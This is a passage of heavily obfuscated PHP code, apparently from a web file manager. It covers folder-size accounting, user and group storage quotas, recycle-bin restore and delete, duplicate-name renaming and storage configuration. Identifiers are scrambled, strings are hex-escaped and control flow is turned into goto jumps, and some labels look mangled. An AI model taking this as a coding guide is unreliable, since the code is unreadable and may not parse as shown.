$e¥‰óİİì¿[33]; if (!isset($DÜâ¢îèù‚[$dãÆ¤•½øß])) { continue; } if ($E³°º¥«…Ü[$e¥‰óİİì¿[432]] == $DÜâ¢îèù‚[$dãÆ¤•½øß][$e¥‰óİİì¿[432]]) { $DÜâ¢îèù‚[$dãÆ¤•½øß][$e¥‰óİİì¿[78]] += $E³°º¥«…Ü[$e¥‰óİİì¿[78]]; } } foreach ($DÜâ¢îèù‚ as $E³°º¥«…Ü) { $C—áµùêœÙ = $this->parentLevelArray($E³°º¥«…Ü[$e¥‰óİİì¿[496]]); foreach ($C—áµùêœÙ as $dãÆ¤•½øß) { $dãÆ¤•½øß = $dãÆ¤•½øß . $e¥‰óİİì¿[33]; if (!isset($DÜâ¢îèù‚[$dãÆ¤•½øß])) { continue; } if ($E³°º¥«…Ü[$e¥‰óİİì¿[432]] == $DÜâ¢îèù‚[$dãÆ¤•½øß][$e¥‰óİİì¿[432]]) { $DÜâ¢îèù‚[$dãÆ¤•½øß][$e¥‰óİİì¿[78]] += $E³°º¥«…Ü[$e¥‰óİİì¿[78]]; } } } $dÛšôÑ©­† = array(); goto Bµ ƒÕ““«; Aá•ÂŞàõÛ: $fº„ ÃÌ™Ê = array($e¥‰óİİì¿[555] => 1, $e¥‰óİİì¿[562] => array($e¥‰óİİì¿[521], $D½ê¨š“½¿[$e¥‰óİİì¿[496]] . $D ìÀ™šè† . $e¥‰óİİì¿[522])); $cœ¸Ú²Â¶È = $e¥‰óİİì¿[1989]; $DÜâ¢îèù‚ = $this->field($cœ¸Ú²Â¶È)->where($fº„ ÃÌ™Ê)->select(); goto aŞÀ˜¯ ¬²; Bµ ƒÕ““«: foreach ($DÜâ¢îèù‚ as $E³°º¥«…Ü) { if ($E³°º¥«…Ü[$e¥‰óİİì¿[78]] == $E³°º¥«…Ü[$e¥‰óİİì¿[1990]]) { continue; } $dÛšôÑ©­†[] = array($e¥‰óİİì¿[404], $E³°º¥«…Ü[$e¥‰óİİì¿[404]], $e¥‰óİİì¿[78], $E³°º¥«…Ü[$e¥‰óİİì¿[78]]); } $this->saveAll($dÛšôÑ©­†); goto c¡µ±æè•¢; Dƒ’¯‡³‰: $DÜâ¢îèù‚[] = $D½ê¨š“½¿; $DÜâ¢îèù‚ = array_to_keyvalue($DÜâ¢îèù‚, $e¥‰óİİì¿[404]); foreach ($DÜâ¢îèù‚ as $E•Øé»ÈÖ => $E³°º¥«…Ü) { $DÜâ¢îèù‚[$E•Øé»ÈÖ][$e¥‰óİİì¿[1990]] = $DÜâ¢îèù‚[$E•Øé»ÈÖ][$e¥‰óİİì¿[78]]; $DÜâ¢îèù‚[$E•Øé»ÈÖ][$e¥‰óİİì¿[78]] = 0; } goto D¡™–ÌïÎĞ; aŞÀ˜¯ ¬²: $fº„ ÃÌ™Ê[$e¥‰óİİì¿[412]] = 0; $DÃÒ¶¾ˆ¹¥ = $this->field($cœ¸Ú²Â¶È)->where($fº„ ÃÌ™Ê)->select(); if (!$DÃÒ¶¾ˆ¹¥) { return; } goto Dƒ’¯‡³‰; eéŒ¥¶£È: $e¥‰óİİì¿ =& $_SERVER[úÉ·öƒÑì©]; $this->sourceCacheClear($D ìÀ™šè†); $D½ê¨š“½¿ = $this->sourceInfo($D ìÀ™šè†); goto Aá•ÂŞàõÛ; c¡µ±æè•¢: } public function userSpaceReset($eÙó††Üê = false) { $A¹äÖ¨‡áÙ =& $_SERVER[úÉ·öƒÑì©]; $Bï†ÕÉÛ˜ = $this->where(array($A¹äÖ¨‡áÙ[413] => self::TYPE_USER, $A¹äÖ¨‡áÙ[493] => $eÙó††Üê, $A¹äÖ¨‡áÙ[412] => 0))->sum($A¹äÖ¨‡áÙ[78]); $Bï†ÕÉÛ˜ = !$Bï†ÕÉÛ˜ || $Bï†ÕÉÛ˜ <= 0 ? 0 : $Bï†ÕÉÛ˜; Model($A¹äÖ¨‡áÙ[511])->userEdit($eÙó††Üê, array($A¹äÖ¨‡áÙ[1685] => $Bï†ÕÉÛ˜)); } public function targetSpaceUpdate($C‹ãÃ•ÖÎ , $a¸òÇ¢èª) { $e æ£©œ¦› =& $_SERVER[úÉ·öƒÑì©]; if (!$a¸òÇ¢èª) { return; } if (!in_array($C‹ãÃ•ÖÎ , array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $B¿‡©®”é’ = $this->targetSpaceSize($C‹ãÃ•ÖÎ , $a¸òÇ¢èª); if ($C‹ãÃ•ÖÎ  == self::TYPE_USER) { Model($e æ£©œ¦›[511])->userEdit($a¸òÇ¢èª, array($e æ£©œ¦›[1685] => $B¿‡©®”é’)); } else { if ($C‹ãÃ•ÖÎ  == self::TYPE_GROUP) { Model($e æ£©œ¦›[495])->groupEdit($a¸òÇ¢èª, array($e æ£©œ¦›[1685] => $B¿‡©®”é’)); } } } public function targetSpaceSize($d¢ËÔæäíø, $CÅ±“ÂÆù) { goto c¨šßò¶Ä; eÀ»Å‚Ş¢: $aÎ°ƒéÎÌÇ = array_to_keyvalue($aÎ°ƒéÎÌÇ, $c¤¸ä“èŒ[33], $c¤¸ä“èŒ[404]); $aÎ°ƒéÎÌÇ = array_unique(array_filter($aÎ°ƒéÎÌÇ)); if ($aÎ°ƒéÎÌÇ) { $d“š§“®´ = array($c¤¸ä“èŒ[419] => array($c¤¸ä“èŒ[420], $aÎ°ƒéÎÌÇ)); $BÙ­ÁÍ‰ += floatval($this->where($d“š§“®´)->sum($c¤¸ä“èŒ[78])); } goto DÃ…ó½‰³ç; c¨šßò¶Ä: $c¤¸ä“èŒ =& $_SERVER[úÉ·öƒÑì©]; $bµé¬èÜî = $this->sourceRoot($d¢ËÔæäíø, $CÅ±“ÂÆù, !0); if (!$bµé¬èÜî) { return 0; } goto e»…¯Ø¢ƒ£; e»…¯Ø¢ƒ£: $BÙ­ÁÍ‰ = floatval($bµé¬èÜî[$c¤¸ä“èŒ[78]]); $d“š§“®´ = array($c¤¸ä“èŒ[562] => array($c¤¸ä“èŒ[521], $c¤¸ä“èŒ[507] . $bµé¬èÜî[$c¤¸ä“èŒ[404]] . $c¤¸ä“èŒ[522])); $aÎ°ƒéÎÌÇ = Model($c¤¸ä“èŒ[430])->field($c¤¸ä“èŒ[419])->where($d“š§“®´)->select(); goto eÀ»Å‚Ş¢; DÃ…ó½‰³ç: $BÙ­ÁÍ‰ = !$BÙ­ÁÍ‰ || $BÙ­ÁÍ‰ <= 0 ? 0 : $BÙ­ÁÍ‰; return $BÙ­ÁÍ‰; goto A£Ì¼®»‘; A£Ì¼®»‘: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($EöÜš¸š—ó) { return $this->fileTypeProfile($EöÜš¸š—ó, SourceModel::TYPE_USER); } public function groupFileTypeProfile($B÷œÒÌÛ¬õ) { return $this->fileTypeProfile($B÷œÒÌÛ¬õ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($b½á“„à‚, $d®‹Ê‰¥âÉ) { goto bÄ™àöğ; bÄ™àöğ: $Få®†À™Œ’ =& $_SERVER[úÉ·öƒÑì©]; $eÛ¦ŸöØ‹¹ = $Få®†À™Œ’[1991] . $b½á“„à‚ . $Få®†À™Œ’[71] . $d®‹Ê‰¥âÉ; $dƒÈÚ¶Ñò = Cache::get($eÛ¦ŸöØ‹¹); goto a‡¯òÏµ¾Æ; f øë³ìÖä: foreach ($C‹Øõğ Ë‚ as $C½‘¯çé¦’ => $DÕÉóºÏª) { $a—™©²§Î…[$Få®†À™Œ’[414]] = $this->fileTypeWhere($C½‘¯çé¦’); $B¸‚ÔÓŞ˜ã[$C½‘¯çé¦’] = array($Få®†À™Œ’[1993] => $DÕÉóºÏª[$Få®†À™Œ’[28]], $Få®†À™Œ’[1994] => $this->where($a—™©²§Î…)->count(), $Få®†À™Œ’[557] => $this->where($a—™©²§Î…)->sum($Få®†À™Œ’[78])); } Cache::set($eÛ¦ŸöØ‹¹, $B¸‚ÔÓŞ˜ã, 1200); return $B¸‚ÔÓŞ˜ã; goto Dé¼š³—µÚ; a‡¯òÏµ¾Æ: if ($dƒÈÚ¶Ñò) { return $dƒÈÚ¶Ñò; } $a—™©²§Î… = array($Få®†À™Œ’[555] => 0); if ($b½á“„à‚ != !1) { $a—™©²§Î…[$Få®†À™Œ’[493]] = $b½á“„à‚; $a—™©²§Î…[$Få®†À™Œ’[413]] = $d®‹Ê‰¥âÉ; } goto f™®³ç½Í; f™®³ç½Í: $B¸‚ÔÓŞ˜ã = array(); $B¸‚ÔÓŞ˜ã[$Få®†À™Œ’[1992]] = array($Få®†À™Œ’[1993] => LNG($Få®†À™Œ’[1992]), $Få®†À™Œ’[1994] => $this->where($a—™©²§Î…)->count(), $Få®†À™Œ’[557] => $this->where($a—™©²§Î…)->sum($Få®†À™Œ’[78])); $C‹Øõğ Ë‚ = KodIO::fileTypeList(); goto f øë³ìÖä; Dé¼š³—µÚ: } public function fileNameExist($e†„Êã¢Ø», $D¾¼±ÄÄë) { $a±Óœ£‡â =& $_SERVER[úÉ·öƒÑì©]; $fÌöáë£¢ç = $this->where(array($a±Óœ£‡â[487] => $e†„Êã¢Ø», $a±Óœ£‡â[28] => $D¾¼±ÄÄë, $a±Óœ£‡â[432] => 0))->find(); return is_array($fÌöáë£¢ç) ? $fÌöáë£¢ç[$a±Óœ£‡â[404]] : !1; } public function childList($aÀÀ•±¢Şì) { goto bîÃ‰œÙ¸; Eƒ¡Èî˜Ø½: $AòÏÔ©—Ş = array($BòªÜ‚ÄÈù[487] => intval($aÀÀ•±¢Şì), $BòªÜ‚ÄÈù[432] => 0); $F°ôáÑ‰ß† = $this->where($AòÏÔ©—Ş)->select(); $F°ôáÑ‰ß† = $F°ôáÑ‰ß† ? $F°ôáÑ‰ß† : array(); goto b ‚¢íõ³ï; b ‚¢íõ³ï: self::$cacheChildList[$Cá½‚ÂÄ‰–] = $F°ôáÑ‰ß†; foreach ($F°ôáÑ‰ß† as $f–ßŸï…íÕ) { $Cá½‚ÂÄ‰– = $BòªÜ‚ÄÈù[447] . $f–ßŸï…íÕ[$BòªÜ‚ÄÈù[404]]; self::$cacheSourceInfo[$Cá½‚ÂÄ‰–] = $f–ßŸï…íÕ; } return $F°ôáÑ‰ß†; goto A¦©àÅô‡˜; bîÃ‰œÙ¸: $BòªÜ‚ÄÈù =& $_SERVER[úÉ·öƒÑì©]; $Cá½‚ÂÄ‰– = $BòªÜ‚ÄÈù[1969] . $aÀÀ•±¢Şì; if (isset(self::$cacheChildList[$Cá½‚ÂÄ‰–])) { return self::$cacheChildList[$Cá½‚ÂÄ‰–]; } goto Eƒ¡Èî˜Ø½; A¦©àÅô‡˜: } public function fileNameAuto($F†åÀÌÜ»”, $A·‚×—·òê, $DÍ„Ğ¬ãÇˆ = REPEAT_RENAME, $FÇõ“àİĞ = false) { $d†Š–¬—÷¿ =& $_SERVER[úÉ·öƒÑì©]; $e– Ï¯©Œ = array($d†Š–¬—÷¿[487] => $F†åÀÌÜ»”, $d†Š–¬—÷¿[432] => 0, $d†Š–¬—÷¿[28] => array($d†Š–¬—÷¿[389], $A·‚×—·òê . $d†Š–¬—÷¿[390])); $f„¬©ùíÅò = $this->field($d†Š–¬—÷¿[28])->where($e– Ï¯©Œ)->select(); $fË©ˆæîè = array_to_keyvalue($f„¬©ùíÅò, $d†Š–¬—÷¿[33], $d†Š–¬—÷¿[28]); return $this->fileNameAutoGet($fË©ˆæîè, $A·‚×—·òê, $DÍ„Ğ¬ãÇˆ, $FÇõ“àİĞ); } public function fileNameAutoGet($A‡Æö…–, $A­­ïš™†ƒ, $eõ³ğ©Û…, $CœÜ¿ùÒ‘¯) { $a¢ëá Â³ =& $_SERVER[úÉ·öƒÑì©]; if ($eõ³ğ©Û… == REPEAT_REPLACE || !$A‡Æö…– || !in_array_not_case($A­­ïš™†ƒ, $A‡Æö…–) || $CœÜ¿ùÒ‘¯ && $eõ³ğ©Û… != REPEAT_RENAME_FOLDER) { return $A­­ïš™†ƒ; } if ($eõ³ğ©Û… == REPEAT_SKIP) { return !1; } $fÕÚ º¡² = $a¢ëá Â³[95] . get_path_ext($A­­ïš™†ƒ); $fÕÚ º¡² = $fÕÚ º¡² == $a¢ëá Â³[95] || $CœÜ¿ùÒ‘¯ ? $a¢ëá Â³[33] : $fÕÚ º¡²; for ($f—–ëÁÈ‚ = 1; $f—–ëÁÈ‚ <= count($A‡Æö…–) + 1; $f—–ëÁÈ‚++) { $D…ÅÇæ²ë = substr($A­­ïš™†ƒ, 0, strlen($A­­ïš™†ƒ) - strlen($fÕÚ º¡²)); $BÆÙÌïÀŠ = $D…ÅÇæ²ë . "\x28{$f—–ëÁÈ‚}\x29{$fÕÚ º¡²}"; if (!in_array_not_case($BÆÙÌïÀŠ, $A‡Æö…–)) { return $BÆÙÌïÀŠ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\162\x63\145\137\x72\x65\x63\171\x63\154\145"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\124\151\x6d\x65", "\x74\151\155\145", "\151\x6e\x73\145\x72\x74", "\x66\x75\x6e\143\x74\151\157\156")); public function listData($f†ç•¦É¬± = false) { $AÛğ÷ùë÷‘ =& $_SERVER[úÉ·öƒÑì©]; $f†ç•¦É¬± = $f†ç•¦É¬± ? $f†ç•¦É¬± : USER_ID; $c…Â“ğ³‡ = $this->where(array($AÛğ÷ùë÷‘[1527] => $f†ç•¦É¬±))->select(); return array_to_keyvalue($c…Â“ğ³‡, $AÛğ÷ùë÷‘[33], $AÛğ÷ùë÷‘[404]); } public function moveToRecycle($d…è‡ÉÒù) { goto E Æà¥Ğç; aŞÄ¼à†ò¯: if (!$A‹ìƒøñÔÑ || $A‹ìƒøñÔÑ[$eòŠãÚ´É…[432]] == $eòŠãÚ´É…[87]) { return; } $Fã®¡Ç¤…ß = array($eòŠãÚ´É…[419] => $d…è‡ÉÒù, $eòŠãÚ´É…[1527] => USER_ID, $eòŠãÚ´É…[558] => $A‹ìƒøñÔÑ[$eòŠãÚ´É…[413]], $eòŠãÚ´É…[559] => $A‹ìƒøñÔÑ[$eòŠãÚ´É…[493]], $eòŠãÚ´É…[562] => $A‹ìƒøñÔÑ[$eòŠãÚ´É…[496]]); $this->add($Fã®¡Ç¤…ß); goto E¬Ûë§Ó×; E¬Ûë§Ó×: $this->recycleMove($d…è‡ÉÒù, 1); if ($A‹ìƒøñÔÑ[$eòŠãÚ´É…[412]] == $eòŠãÚ´É…[87]) { $C®ôöœ‡ğŞ = array($eòŠãÚ´É…[562] => array($eòŠãÚ´É…[521], $A‹ìƒøñÔÑ[$eòŠãÚ´É…[496]] . $d…è‡ÉÒù . $eòŠãÚ´É…[522])); $fœÄçÎ¤Éî->where($C®ôöœ‡ğŞ)->setField($eòŠãÚ´É…[432], 1); } goto a‚±·²Éõ; E Æà¥Ğç: $eòŠãÚ´É… =& $_SERVER[úÉ·öƒÑì©]; $fœÄçÎ¤Éî = Model($eòŠãÚ´É…[1213]); $A‹ìƒøñÔÑ = $fœÄçÎ¤Éî->sourceInfo($d…è‡ÉÒù); goto aŞÄ¼à†ò¯; a‚±·²Éõ: } public function clear() { $this->remove(!1); } public function remove($Aç†„Å‹…Ç = false, $B£Æ¬Ôª¹ = false) { goto B°Òµº¼Ó±; B°Òµº¼Ó±: $fõ¸Á…· =& $_SERVER[úÉ·öƒÑì©]; $B£Æ¬Ôª¹ = $B£Æ¬Ôª¹ ? $B£Æ¬Ôª¹ : USER_ID; $cĞ­ÆÉ°ë§ = Model($fõ¸Á…·[1213]); goto D…ö£‚©Õ²; D…ö£‚©Õ²: $F±²ë¿Õ = $this->listData($B£Æ¬Ôª¹); $Aç†„Å‹…Ç = $Aç†„Å‹…Ç === !1 ? !1 : $Aç†„Å‹…Ç; $b–ÆŠ•¥£ = array(); goto D­ÚİØí‹; D­ÚİØí‹: foreach ($F±²ë¿Õ as $fµÅìğÒô) { if ($Aç†„Å‹…Ç != !1 && !in_array($fµÅìğÒô, $Aç†„Å‹…Ç)) { continue; } $dğªäØß… = $cĞ­ÆÉ°ë§->sourceInfo($fµÅìğÒô); $cĞ­ÆÉ°ë§->remove($fµÅìğÒô, !1); $CÉ¥£î½›˜ = $dğªäØß…[$fõ¸Á…·[413]] . $fõ¸Á…·[71] . $dğªäØß…[$fõ¸Á…·[493]]; $b–ÆŠ•¥£[$CÉ¥£î½›˜] = array($fõ¸Á…·[558] => $dğªäØß…[$fõ¸Á…·[413]], $fõ¸Á…·[493] => $dğªäØß…[$fõ¸Á…·[493]]); $this->where(array($fõ¸Á…·[404] => $fµÅìğÒô))->delete(); } foreach ($b–ÆŠ•¥£ as $f’ÙôÚ×»‚) { $cĞ­ÆÉ°ë§->targetSpaceUpdate($f’ÙôÚ×»‚[$fõ¸Á…·[413]], $f’ÙôÚ×»‚[$fõ¸Á…·[493]]); } goto A¥¥š§ÏèÏ; A¥¥š§ÏèÏ: } public function restore($D¦Éò…„±Ì = false) { $D‚¤è«›ÅÅ = $this->listData(); $this->_restoreSource($D‚¤è«›ÅÅ, $D¦Éò…„±Ì); } public function removeUserAll($f¿¬Å¤·Ã²) { $this->remove(!1, $f¿¬Å¤·Ã²); } private function _restoreSource($Aï÷ÏÜÎ, $cˆ§ç®†Ú) { goto f‡È—…ÉØ­; C­‡‰ˆ›Øµ: $DÕÑ¬­Î->updateModifyTime($fë—ÇÒËØ); goto aĞïÅç¡²¹; fšç»£éè: if (!$Aï÷ÏÜÎ) { return !0; } $fë—ÇÒËØ = array(); foreach ($Aï÷ÏÜÎ as $aøŠàØ“•Š) { goto A®íÜ¢µï; Eß´ƒÀàğô: if ($f¼Ğ´öÍ‚¦[$AìªÔ¾¢ÒÍ[432]] == $AìªÔ¾¢ÒÍ[87]) { continue; } $DÕÑ¬­Î->lockMoveStart($aøŠàØ“•Š); $this->recycleMove($aøŠàØ“•Š, 0); goto BÖ©¢ñ¯Ò; BÖ©¢ñ¯Ò: if ($bÁÇğ‘Ï©ì[$AìªÔ¾¢ÒÍ[412]] == $AìªÔ¾¢ÒÍ[87]) { $báœ…¸ˆº = array($AìªÔ¾¢ÒÍ[562] => array($AìªÔ¾¢ÒÍ[521], $bÁÇğ‘Ï©ì[$AìªÔ¾¢ÒÍ[496]] . $aøŠàØ“•Š . $AìªÔ¾¢ÒÍ[522])); $DÕÑ¬­Î->where($báœ…¸ˆº)->setField($AìªÔ¾¢ÒÍ[432], 0); $this->restoreFolderChildren($aøŠàØ“•Š, $Aï÷ÏÜÎ); } $this->where(array($AìªÔ¾¢ÒÍ[404] => $aøŠàØ“•Š))->delete(); $DÕÑ¬­Î->folderSizeReset($bÁÇğ‘Ï©ì[$AìªÔ¾¢ÒÍ[487]]); goto e‰Ş¶ÓïéÕ; A®íÜ¢µï: if ($cˆ§ç®†Ú != !1 && !in_array($aøŠàØ“•Š, $cˆ§ç®†Ú)) { continue; } $bÁÇğ‘Ï©ì = $DÕÑ¬­Î->sourceInfo($aøŠàØ“•Š); $f¼Ğ´öÍ‚¦ = $DÕÑ¬­Î->sourceInfo($bÁÇğ‘Ï©ì[$AìªÔ¾¢ÒÍ[487]]); goto Eß´ƒÀàğô; e‰Ş¶ÓïéÕ: $fë—ÇÒËØ[] = $bÁÇğ‘Ï©ì[$AìªÔ¾¢ÒÍ[487]]; if ($bÁÇğ‘Ï©ì[$AìªÔ¾¢ÒÍ[412]] == $AìªÔ¾¢ÒÍ[87]) { $fë—ÇÒËØ[] = $aøŠàØ“•Š; } $DÕÑ¬­Î->lockMoveEnd($aøŠàØ“•Š); goto bÚˆÏâ¡Ì; bÚˆÏâ¡Ì: } goto C­‡‰ˆ›Øµ; f‡È—…ÉØ­: $AìªÔ¾¢ÒÍ =& $_SERVER[úÉ·öƒÑì©]; $DÕÑ¬­Î = Model($AìªÔ¾¢ÒÍ[1213]); $cˆ§ç®†Ú = $cˆ§ç®†Ú == !1 ? !1 : $cˆ§ç®†Ú; goto fšç»£éè; aĞïÅç¡²¹: } private function restoreFolderChildren($dõáµ––ØŠ, $Bï¦ä°Ù‡·) { goto b‚Ë™ó«À; eŞ«ñ±¶“Ù: foreach ($Bï¦ä°Ù‡· as $d¸‰›ï‡­) { if ($d¸‰›ï‡­ == $dõáµ––ØŠ) { continue; } if (!$EõÏÂô‰¦Ğ->isParentOf($dõáµ––ØŠ, $d¸‰›ï‡­)) { continue; } $cæ—“‹†ßœ = $EõÏÂô‰¦Ğ->sourceInfo($d¸‰›ï‡­); if ($cæ—“‹†ßœ[$cğ…½‹ƒÊ[412]] == $cğ…½‹ƒÊ[87]) { $d¥¢‚ÆñÁ[] = array($cğ…½‹ƒÊ[562] => array($cğ…½‹ƒÊ[521], $cæ—“‹†ßœ[$cğ…½‹ƒÊ[496]] . $d¸‰›ï‡­ . $cğ…½‹ƒÊ[522])); } else { $d¥¢‚ÆñÁ[$cğ…½‹ƒÊ[404]][1][] = $d¸‰›ï‡­; } } if (!$d¥¢‚ÆñÁ[$cğ…½‹ƒÊ[404]][1]) { unset($d¥¢‚ÆñÁ[$cğ…½‹ƒÊ[404]]); } if (!$d¥¢‚ÆñÁ) { return; } goto F¹µ¹å×‹œ; b‚Ë™ó«À: $cğ…½‹ƒÊ =& $_SERVER[úÉ·öƒÑì©]; $EõÏÂô‰¦Ğ = Model($cğ…½‹ƒÊ[1213]); $d¥¢‚ÆñÁ = array($cğ…½‹ƒÊ[404] => array($cğ…½‹ƒÊ[7], array())); goto eŞ«ñ±¶“Ù; F¹µ¹å×‹œ: $d¥¢‚ÆñÁ[$cğ…½‹ƒÊ[404]][1] = array_unique($d¥¢‚ÆñÁ[$cğ…½‹ƒÊ[404]][1]); $d¥¢‚ÆñÁ[$cğ…½‹ƒÊ[965]] = $cğ…½‹ƒÊ[1786]; $EõÏÂô‰¦Ğ->where($d¥¢‚ÆñÁ)->setField($cğ…½‹ƒÊ[432], 1); goto CÌÄ½¶é×Î; CÌÄ½¶é×Î: } private function recycleMove($EŞÙÕ‘íÇ, $Eè‹§íÙ¾é = 1) { $E¾å¥±ªæ =& $_SERVER[úÉ·öƒÑì©]; $a°¤®³÷á‚ = Model($E¾å¥±ªæ[1213]); $BîƒâìÔÎ’ = Model($E¾å¥±ªæ[1995]); $e˜¼¿ÌŠ¶Û = array($E¾å¥±ªæ[404] => $EŞÙÕ‘íÇ); if ($Eè‹§íÙ¾é) { $a°¤®³÷á‚->where($e˜¼¿ÌŠ¶Û)->setField($E¾å¥±ªæ[432], 1); $BîƒâìÔÎ’->eventRecycle($EŞÙÕ‘íÇ, $E¾å¥±ªæ[1996]); } else { $aÌÖ İ½Å = $a°¤®³÷á‚->where($e˜¼¿ÌŠ¶Û)->find(); $b©¸îïÅ´¶ = $aÌÖ İ½Å[$E¾å¥±ªæ[412]] == $E¾å¥±ªæ[87]; $a¼Şµßß£é = $a°¤®³÷á‚->fileNameAuto($aÌÖ İ½Å[$E¾å¥±ªæ[487]], $aÌÖ İ½Å[$E¾å¥±ªæ[28]], REPEAT_RENAME_FOLDER, $b©¸îïÅ´¶); if ($a¼Şµßß£é != $aÌÖ İ½Å[$E¾å¥±ªæ[28]]) { $a°¤®³÷á‚->rename($EŞÙÕ‘íÇ, $a¼Şµßß£é); } $a°¤®³÷á‚->where($e˜¼¿ÌŠ¶Û)->setField($E¾å¥±ªæ[432], 0); $BîƒâìÔÎ’->eventRecycle($EŞÙÕ‘íÇ, $E¾å¥±ªæ[1997]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x73\164\x6f\162\141\x67\145\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\163\x69\x7a\145\115\x61\x78", "\163\x79\163\164\145\155", "\144\x65\x66\x61\x75\154\x74", "\144\x72\151\166\x65\162", "\143\x6f\x6e\146\151\147"); public function listData($c‰¾Ë±‡Úã = false, $Dª™âÕ§¥¨ = "\x6d\157\144\151\x66\171\124\x69\x6d\145", $DÈï¼‹Í°ä = false) { $B¨©òË™¨À =& $_SERVER[úÉ·öƒÑì©]; $BŠ¢ÌŠ‹Ç = parent::listData($c‰¾Ë±‡Úã, $Dª™âÕ§¥¨, $DÈï¼‹Í°ä); if ($c‰¾Ë±‡Úã) { return $BŠ¢ÌŠ‹Ç; } $a¢œ„×Õù = $this->ioSizeUseGet(array_to_keyvalue($BŠ¢ÌŠ‹Ç, $B¨©òË™¨À[33], $B¨©òË™¨À[402])); foreach ($BŠ¢ÌŠ‹Ç as $Cõ–Ÿõ¾Íƒ => $F÷¶Öš´©Ú) { unset($BŠ¢ÌŠ‹Ç[$Cõ–Ÿõ¾Íƒ][$B¨©òË™¨À[6]]); $BŠ¢ÌŠ‹Ç[$Cõ–Ÿõ¾Íƒ][$B¨©òË™¨À[1685]] = isset($a¢œ„×Õù[$F÷¶Öš´©Ú[$B¨©òË™¨À[402]]]) ? $a¢œ„×Õù[$F÷¶Öš´©Ú[$B¨©òË™¨À[402]]] : 0; } return $BŠ¢ÌŠ‹Ç; } public function ioSizeUseGet($eøÜâšÉµñ) { goto fµÚ¾ÄãŠ; Cå”ğŞº¢‹: $c£Æìè¥Åë = array($eöÒˆ·¿ù[798] => array($eöÒˆ·¿ù[7], $eøÜâšÉµñ)); $CÕÈËÁØ· = Model($eöÒˆ·¿ù[763])->field($b‹¼ù¸Î)->where($c£Æìè¥Åë)->group($eöÒˆ·¿ù[798])->select(); $CÕÈËÁØ· = array_to_keyvalue($CÕÈËÁØ·, $eöÒˆ·¿ù[402], $eöÒˆ·¿ù[78]); goto Féåê¢¤¨Å; FóÀÏ¶Úíø: $CÕÈËÁØ· = Cache::get($bñŞˆ³¼¡´); if ($CÕÈËÁØ·) { return $CÕÈËÁØ·; } $b‹¼ù¸Î = array($eöÒˆ·¿ù[798] => $eöÒˆ·¿ù[402], $eöÒˆ·¿ù[1999] => $eöÒˆ·¿ù[78]); goto Cå”ğŞº¢‹; fµÚ¾ÄãŠ: $eöÒˆ·¿ù =& $_SERVER[úÉ·öƒÑì©]; if (!$eøÜâšÉµñ) { return array(); } $bñŞˆ³¼¡´ = $eöÒˆ·¿ù[1998] . implode($eöÒˆ·¿ù[47], $eøÜâšÉµñ); goto FóÀÏ¶Úíø; Féåê¢¤¨Å: Cache::set($bñŞˆ³¼¡´, $CÕÈËÁØ·, 600); return $CÕÈËÁØ·; goto fŒì—æøíâ; fŒì—æøíâ: } public function getConfig($eÃô˜§·£Ø) { $c·†°†Ó‡ = parent::listData($eÃô˜§·£Ø); return json_decode($c·†°†Ó‡[$_SERVER[úÉ·öƒÑì©][6]], !0); } public function update($EŠÂÜÃŠŸ, $C‡¼°øÓíó) { goto d„¯¬Ê³; F¼À½ÌÂğ: if (isset($fÔË¡ˆ¯Ş[$e¼‡Ñøï‰]) && $fÔË¡ˆ¯Ş[$e¼‡Ñøï‰][$fÖé—ÒÄƒ[402]] != $EŠÂÜÃŠŸ) { return !1; } if (isset($C‡¼°øÓíó[$fÖé—ÒÄƒ[2000]]) && $C‡¼°øÓíó[$fÖé—ÒÄƒ[2000]] == $fÖé—ÒÄƒ[87]) { $this->checkConfig($C‡¼°øÓíó); } unset($C‡¼°øÓíó[$fÖé—ÒÄƒ[2000]]); goto e¼ÅÍËÏ ”; e¼ÅÍËÏ ”: $C»à³í†ù¹ = parent::update($EŠÂÜÃŠŸ, $C‡¼°øÓíó); if ($C»à³í†ù¹ && $C‡¼°øÓíó[$fÖé—ÒÄƒ[34]]) { foreach ($fÔË¡ˆ¯Ş as $A¯šë¹ÓŠ–) { if ($A¯šë¹ÓŠ–[$fÖé—ÒÄƒ[34]] && $A¯šë¹ÓŠ–[$fÖé—ÒÄƒ[402]] != $EŠÂÜÃŠŸ) { parent::update($A¯šë¹ÓŠ–[$fÖé—ÒÄƒ[402]], array($fÖé—ÒÄƒ[34] => 0)); } } } return $C»à³í†ù¹; goto Aå«„Ú‰ÕÙ; d„¯¬Ê³: $fÖé—ÒÄƒ =& $_SERVER[úÉ·öƒÑì©]; $e¼‡Ñøï‰ = $C‡¼°øÓíó[$fÖé—ÒÄƒ[28]]; $fÔË¡ˆ¯Ş = array_to_keyvalue(parent::listData(), $fÖé—ÒÄƒ[28]); goto F¼À½ÌÂğ; Aå«„Ú‰ÕÙ: } public function add($Bä—Ù–ƒõ£) { goto bì‡…¥ôõƒ; cØ‰àï÷‡ˆ: return $Aãâ®³¶×; goto EæáºÓ£È; bì‡…¥ôõƒ: $d¸µá‹Ôª =& $_SERVER[úÉ·öƒÑì©]; $Dø×çÂ—ˆ¾ = array_to_keyvalue(parent::listData(), $d¸µá‹Ôª[28]); if (isset($Dø×çÂ—ˆ¾[$Bä—Ù–ƒõ£[$d¸µá‹Ôª[28]]])) { return !1; } goto B…£´Æå¦; B…£´Æå¦: $this->checkConfig($Bä—Ù–ƒõ£); $Aãâ®³¶× = parent::insert($Bä—Ù–ƒõ£); if ($Aãâ®³¶× && $Bä—Ù–ƒõ£[$d¸µá‹Ôª[34]]) { foreach ($Dø×çÂ—ˆ¾ as $Dº¡Ç¦¡‰İ) { if ($Dº¡Ç¦¡‰İ[$d¸µá‹Ôª[34]]) { parent::update($Dº¡Ç¦¡‰İ[$d¸µá‹Ôª[402]], array($d¸µá‹Ôª[34] => 0)); } } } goto cØ‰àï÷‡ˆ; EæáºÓ£È: } public function checkConfig(&$BÖô‡¨ŒÜÚ, $B‰Ğ‘¶¨’Ö = false) { goto Fàñâœå; fë‡ŸÙà: $b ÙîâƒŒ = new $aôÆ¡âò”Ò($aöÁ“ƒ±×); if (in_array($eÇ‰¥¶¥, $b ÙîâƒŒ->objectDriver)) { if (!$b ÙîâƒŒ->isBucketCors() && !$b 